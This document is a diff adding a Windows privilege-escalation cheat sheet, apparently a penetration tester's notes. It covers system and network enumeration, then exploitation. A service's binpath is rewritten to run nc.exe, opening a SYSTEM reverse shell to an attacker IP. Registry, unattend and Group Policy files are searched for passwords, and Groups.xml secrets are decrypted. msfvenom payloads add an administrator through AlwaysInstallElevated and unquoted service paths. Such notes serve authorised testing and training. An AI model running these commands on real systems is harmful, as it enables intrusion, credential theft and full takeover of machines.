@@ -1,0 +1,144 @@
+Windows
+
+Enumeration
+
+# basics
+systeminfo
+hostname
+echo %username%
+
+# users
+net users
+net user <username>
+
+# network
+ipconfig /all
+route print
+arp -A
+netstat -ano  # active network connections
+
+# firewall status
+netsh firewall show state
+netsh firewall show config
+netsh advfirewall firewall show rule all
+
+# systeminfo output save in a file, check for vulnerabilities
+https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
+python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt 
+
+# Search patches for given patch
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+
+--------------------------------------
+Kernel
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+# check for possible exploits, find a place to upload (eg: C:\Inetpub or C:\temp) it, run exe
+
+--------------------------------------
+Weak permissions
+# this example is for XP SP0
+# upload accesschk.exe to a writable directory first 
+# for XP version 5.2 of accesschk.exe is needed
+
+# check for serices with weak permissions
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+# check for the found services above
+accesschk.exe -ucqv upnphost
+# upload nc.exe to writable directory
+sc config upnphost binpath= "C:\Inetpub\nc.exe -nv <attackerip> 9988 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+# check the status now
+sc qc upnphost
+# change start option as AUTO-START 
+sc config SSDPSRV start=auto
+#start the services
+net start SSDPSRV
+net stop upnphost
+net start upnphost
+
+# listen on port 9988 and you'll get a shell with NT AUTHORITY\SYSTEM privileges
+
+--------------------------------------
+
+Registry Checks for Passwords
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+--------------------------------------
+Places to Check for Credentials
+
+C:\sysprep.inf
+C:\sysprep\sysprep.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+
+dir /b /s unattend.xml
+dir /b /s web.config
+dir /b /s sysprep.inf
+dir /b /s sysprep.xml
+dir /b /s *pass*
+dir /b /s vnc.ini
+
+----------------------------
+Groups.xml
+# Look up ip-addres of DC
+nslookup nameofserver.whatever.local
+
+# It will output something like this
+Address:  192.168.1.101
+
+# Now we mount it
+net use z: \\192.168.1.101\SYSVOL
+
+# And enter it
+z:
+
+# Now we search for the groups.xml file
+dir Groups.xml /s
+
+# decrypt the password in it
+gpp-decrypt <pass>
+
+-----------------------------
+
+AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+# From the output, notice that “AlwaysInstallElevated” value is 1.
+
+# Exploitation:
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi
+Place 'setup.msi' in 'C:\Temp'
+msiexec /quiet /qn /i C:\Temp\setup.msi
+net localgroup Administrators
+
+---------------------------------
+Find writable files
+
+
+dir /a-r-d /s /b
+/a is to search for attributes. In this case r is read only and d is directory. (look for writable files only)
+/s means recurse subdirectories
+/b means bare format. Path and filename only.
+
+-----------------------------------
+Unquoted Path
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
+# Suppose we found: C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
+# check for permissions of folder path
+icacls "C:\Program Files (x86)\Program Folder" 
+
+# exploit
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
+#Open command prompt and type: 
+sc start unquotedsrvc
+net localgroup Administrators
+
+
